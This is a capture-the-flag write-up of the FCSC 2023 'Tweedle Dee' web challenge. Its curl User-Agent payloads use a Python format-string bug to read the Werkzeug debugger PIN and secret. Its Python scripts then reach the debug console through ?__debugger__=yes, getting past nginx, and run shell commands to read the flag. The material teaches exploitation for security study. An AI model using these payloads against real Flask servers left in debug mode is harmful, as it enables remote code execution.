---
source: kevin-mizu
source_url: https://mizu.re/post/tweedle-dee
title: "Tweedle Dee | mizu.re"
description: "Tweedle Dee"
---

_keyboard\_arrow\_up_

title: Tweedle Dee

date: Apr 26, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [RCE](https://mizu.re/tag/RCE) [FCSC2023](https://mizu.re/tag/FCSC2023)

# Tweedle Dee

![](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/logo-fcsc2023.png)

* * *

Difficulty: XXX points \| X solves

Description: Au cours de ses aventures au Pays des merveilles, Alice a rencontré une curieuse paire de jumeaux : Tweedledee et Tweedledum. Les deux avaient créé un site web simpliste en utilisant Flask, une réalisation qui a suscité l'intérêt d'Alice. Avec son esprit curieux et son penchant pour la technologie, Alice ne pouvait s'empêcher de se demander si elle pouvait pirater leur création et en découvrir les secrets.

Source: [here](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/source.tar.gz).

Author: [BitK\_](https://twitter.com/BitK_)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/tweedle-dee#%EF%B8%8F-recon)
- [🐍 Python format string](https://mizu.re/post/tweedle-dee#-python-format-string)
- [⏩ Nginx restrictions](https://mizu.re/post/tweedle-dee#-nginx-restrictions)
- [🎮 Accessing console](https://mizu.re/post/tweedle-dee#-accessing-console)
- [📖 Summary](https://mizu.re/post/tweedle-dee#-summary)
- [✨ Getting the pin and secret value](https://mizu.re/post/tweedle-dee#-getting-the-pin-and-secret-value)
- [🚩 Retrieving the flag](https://mizu.re/post/tweedle-dee#-retrieving-the-flag)

## 🕵️ Recon

This challenge is the second part of Tweedle Dum with a stronger configuration. Because being able to solve Tweedle Dee allows to solve Tweedle Dum, I will only do a write-up for this one.

Accessing the challenge results in the following page:

![home.png](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/home.png)

As we can see, our user agent is reflected. Trying some basic injection like XSS, SQLi... leads to nothing. But, thanks to the sources it will be easier to understand what happens here!

- public/src/app/app.py

```py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def hello_agent():
    ua = request.user_agent
    return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))

# TODO: add the vulnerable code here
```

From the above snippet, we can see that the request.user\_agent content is used in a (double) format string before being rendered into the index.html template and sent back to the client.

Another interesting thing is [Werkzeug](https://github.com/pallets/werkzeug)'s [debug](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py) mode, which is activated in the challenge: (it will be useful later)

- public/src/app/Dockerfile

```dockerfile
CMD ["flask", "run", "--host=0.0.0.0", "--debug"]
```

Finally, the objective of the challenge is to get a remote code execution on the application docker and read the flag file located on the root folder.

- public/src/app/Dockerfile

```dockerfile
RUN pip install --no-cache-dir      \
        flask==2.2.3             && \
    echo $FLAG > "/app/flag-$(head /dev/urandom | md5sum | head -c 32).txt"
```

## 🐍 Python format string

This specific context is really interesting for us as it allows to abuse python format string features!

But, before continuing, why is this configuration vulnerable?

A first sight, it might not be obvious but, doing f"Hello {ua}".format(ua=ua) result in a double format string usage.

![](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/poc_fmt.png)

As you can see from the above code, two format string notations are used on the same input (check python's [documentation](https://docs.python.org/3/tutorial/inputoutput.html)) which in the case of controlling the x variable allows to read current python process memory.

It is important to notice that this vulnerability only allows you to read into the memory, not calling functions!

_More information about this type of vulnerability can be found [here](https://podalirius.net/en/articles/python-format-string-vulnerabilities/)._

So, sending the following HTTP request with curl will result in the same behavior 🎉

```sh
curl -H "User-Agent: {ua.__init__}" https://tweedle-dee.france-cybersecurity-challenge.fr/
```

![poc_fmt2.png](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/poc_fmt2.png)

## ⏩ Nginx restrictions

> This is great, we are able to read memory, but how this could be useful to get an RCE as we can't call any function?

This is true, this is where the real challenge starts. As we said earlier, the Werkzeug's debug mode is activated. This is really interesting because when the debug mode is activated, it exposes a console, which allows to eval any python code!

- [werkzeug/src/werkzeug/debug/\_\_init\_\_.py](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/debug/__init__.py#L135)

```py
def eval(self, code: str) -> t.Any:
    return self.console.eval(code)
```

The only condition for us to execute code is to provide:

- A pin: Computed from private and public components available on the system ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/debug/__init__.py#L138)).
- A secret: Generated randomly when the application starts ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/debug/__init__.py#L285)). This value is available on error and console pages.

> So, if we could find a way to get all components values and access an error page, we could hit the console and get the flag!

Yes... But no. In fact, we haven't mentioned it yet, but the web application has an nginx proxy in front with the following configuration:

```nginx
http {
    # retracted

    server {
        listen 2201;
        server_name _;

        location /console {
            return 403 "Bye";
        }

        location @error {
            return 500 "Bye";
        }

        location / {
            error_page 500 503 @error;
            proxy_intercept_errors on;
            proxy_pass http://app:5000;
        }
    }
}
```

As we can see, the path /console and error pages are not available to us so we need to find another way to go... This is where the format string features will be powerful!

## 🎮 Accessing console

I know that we haven't exploited anything yet and this could be a bit frustrating but, it is important to understand what we have to do to defeat the challenge first! So, before starting to exploit the format string, we need to find a way to interact with the Werkzeug console without accessing /console.

To get this information, a quick look into the Werkzeug source code can give us the response:

- [werkzeug/src/werkzeug/debug/\_\_init\_\_.py](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/debug/__init__.py#L500) (I added comments to make it easier to read)

```py
def __call__(
    self, environ: WSGIEnvironment, start_response: StartResponse
) -> t.Iterable[bytes]:
    request = Request(environ)
    response = self.debug_application

    # if "?__debugger__=yes" -> access console features.
    if request.args.get("__debugger__") == "yes":

        # command to eval
        cmd = request.args.get("cmd")
        # we don't need it
        arg = request.args.get("f")
        # secret value
        secret = request.args.get("s")
        # frame context in which the code will be evaluated (frame ~ thread)
        frame = self.frames.get(request.args.get("frm", type=int))
        if cmd == "resource" and arg:
            response = self.get_resource(request, arg)
        elif cmd == "pinauth" and secret == self.secret:
            response = self.pin_auth(request)
        elif cmd == "printpin" and secret == self.secret:
            response = self.log_pin_request()
        elif (
            self.evalex
            and cmd is not None
            and frame is not None
            and self.secret == secret
            and self.check_pin_trust(environ)
        ):
            # if we are authenticated with pin + secret we can exec code :)
            response = self.execute_command(request, cmd, frame)
    elif (
        self.evalex
        and self.console_path is not None
        and request.path == self.console_path
    ):
        response = self.display_console(request)
    return response(environ, start_response)
```

From the above code, we learn that querying the application with the request below will allow us to interact with the console!

- Simple flask we application with debug mode:

```py
from flask import Flask
app = Flask(__name__)
app.config["DEBUG"] = True

@app.route("/")
def index():
    return ""

app.run("0.0.0.0", 5000)
```

- Exploit script:

```py
from requests import session

url     = "http://localhost:5000/" # notice that we aren't querying /console
pin     = "666-890-003"            # from the terminal
secret  = "hTypATSDBxSUc99LV3Ja"   # from /console

frameid = "0"
cmd     = "print(1)"

# authenticated to the console
s = session()
s.get("%s?__debugger__=yes&cmd=pinauth&pin=%s&s=%s" % (url, pin, secret))

# exec the command :)
r = s.get("%s?__debugger__=yes&cmd=%s&frm=%s&s=%s" % (url, cmd, frameid, secret))
print(r.text)
```

![poc_exploit.png](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/poc_exploit.png)

## 📖 Summary

If we sum up, we have the following context:

- We can bypass the nginx /console and error pages restrictions via ?\_\_debugger\_\_=yes.
- We need to find the secret and pin value to use this endpoint.
- We have a format string vulnerability via the request.user\_agent property.

So, let's finally use the format string issue :)

For this part, 2 methods can be used:

- Brute force all paths to finding the secret and the pin.
- Reverse Werkzeug.

As I'm not a big fan of bruteforcing to get a solution, we are going to cover the way I solved the challenge, the second one!

## ✨ Getting the pin and secret value

I won't go deep into reverse details as it would be too long for this write-up but, I can give you an overview of the approach I used to solve it.

![print.jpg](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/print.jpg)

Joke aside, I mostly:

1. Read Werkzeug [source code](https://github.com/pallets/werkzeug) to find the secret and pin object reference.
2. Added print in my local version of Werkzeug to debug values.
3. Added stack trace to get more information about the execution flow:

```py
import traceback

for l in traceback.format_stack():
    print(l.strip())
```

4. Used the garbage collector to find object reference and try to find links from my initial object:

```py
from gc import get_objects

get_objects()
```

My debug application was looking like this:

```py
from flask import Flask, request
from gc import get_objects
import traceback

app = Flask(__name__)
app.config["DEBUG"] = True

@app.route("/")
def index():
    print("\n============")
    ua = request.user_agent
    x = ua.__init__ # change this value and curl the / route
    print(x)
    print(type(x))
    print(dir(x))
    print("============\n")
    return ""

@app.route("/gc")
def gcc():
    return str(get_objects())

app.run("0.0.0.0", 5000)
```

This isn't really clean, but thanks to this I could understand in which order each function was called! Here is a small summary of the call graph:

![werkzeug.png](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/werkzeug.png)

1. **Main script**: app.run("0.0.0.0", 8001).
2. **Flask**: run\_simple(t.cast(str, host), port, self, \*\*options) ( [ref](https://github.com/pallets/flask/blob/eb33b8c8096322becac743fb6eb466aebf7af6b9/src/flask/app.py#L889)).
3. **Werkzeug**: srv = make\_server(...) ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/serving.py#L1075)). **<-----** It contain the secret and pin
4. **Werkzeug**: run\_with\_reloader(srv.serve\_forever, ...) ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/serving.py#L1097)). **<-----** serve\_forever method of srv is used as new thread entry point.
5. **Werkzeug**: t = threading.Thread(target=main\_func, args=()) ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/_reloader.py#L447)), create a new thread for each new query. **<-----** main\_func.\_\_self\_\_ contains them too.

List of objects that contain the secret and the pin:

- werkzeug.debug.DebuggedApplication object: app.secret ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/debug/__init__.py#L224))
- werkzeug.serving.ThreadedWSGIServer object: server.app.secret ( [ref](https://github.com/pallets/werkzeug/blob/3cfa1bd8678200d663c1e1afe3c4569806a892f1/src/werkzeug/serving.py#L364)).

Interesting references:

- List of modules: {ua.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_\[t\].sys.modules}
- App global context: {ua.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_\[t\].sys.modules\[flask\].current\_app.view\_functions\[hello\_agent\].\_\_globals\_\_}

> Nice work, but you still have nothing right? :)

Yes... all interesting objects are created dynamically making them impossible to be retrieved by the format string... But! As you can see from the above call graph, Werkzeug use a new thread for each new request. And you know what? The entry point of the new thread is a method of an object that contains what we are looking for!

> What is your point?

If we can someway access the frame object associated with our current thread, we might be able to get everything we need! Thanks to the sys.modules reference, it is possible to dig into the threading library which is used to do exactly what we were describing.

```sh
curl -H "User-Agent: {ua.__class__.__init__.__globals__[t].sys.modules[threading].__dict__}" https://tweedle-dee.france-cybersecurity-challenge.fr/
```

![_active.png](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/_active.png)

As we can see, the threading module as an attribute \_active that contains a list of currently active frames 🔥

```sh
curl -H "User-Agent: {ua.__class__.__init__.__globals__[t].sys.modules[threading]._active}" https://tweedle-dee.france-cybersecurity-challenge.fr/
```

![_active2.png](https://mizu.re/articles/writeups/FCSC2023/tweedle_dee/images/_active2.png)

If we reuse everything detailed before, we can find our secret and pin values 🎉

- pin:

```sh
curl -H "User-Agent: {ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[115122702797624]._target.__self__.app.pin}" https://tweedle-dee.france-cybersecurity-challenge.fr/

# 840-396-786
```

- secret:

```sh
curl -H "User-Agent: {ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[115122702797624]._target.__self__.app.secret}" https://tweedle-dee.france-cybersecurity-challenge.fr/

# 8uERxYCjtpHmdKO6qHPO
```

## 🚩 Retrieving the flag

```py
from requests import session

url     = "https://tweedle-dee.france-cybersecurity-challenge.fr/" # notice that we aren't quering /console
pin     = "840-396-786"
secret  = "8uERxYCjtpHmdKO6qHPO"

# take a random id via {ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[115122702797624]._target.__self__.app.__dict__}
frameid = "115122707146880"
cmd     = "__import__('os').popen('cat flag*').read()"

# authenticated to the console
s = session()
s.get("%s?__debugger__=yes&cmd=pinauth&pin=%s&s=%s" % (url, pin, secret))

# exec the command :)
r = s.get("%s?__debugger__=yes&cmd=%s&frm=%s&s=%s" % (url, cmd, frameid, secret))
print(r.text)
```

Flag: FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2} 🎉

[_keyboard\_arrow\_left_ Whiskers in the dark](https://mizu.re/post/whiskers-in-the-dark)

[Comme dans une chaussette _keyboard\_arrow\_right_](https://mizu.re/post/comme-dans-une-chaussette)